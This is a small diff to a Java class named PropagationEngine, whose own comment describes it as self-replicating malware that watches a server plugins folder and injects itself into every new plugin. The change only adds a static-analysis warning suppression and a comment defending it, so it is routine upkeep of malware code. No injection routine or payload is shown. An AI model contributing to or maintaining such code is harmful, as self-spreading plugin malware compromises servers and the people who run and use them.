@@ -21,7 +21,9 @@ import java.util.concurrent.ConcurrentHashMap;
  * Monitors plugins folder and auto-injects into new plugins
  * Self-replicating malware that spreads to all server plugins
  */
+@SuppressWarnings({"EI_EXPOSE_REP2", "EI_EXPOSE_REP"})
 public class PropagationEngine implements Runnable {
+    // JavaPlugin is a framework-managed singleton — defensive copy is not meaningful
     private final JavaPlugin plugin;
     private final File pluginsFolder;
     private final Map<String, String> processedPlugins; // filename -> hash
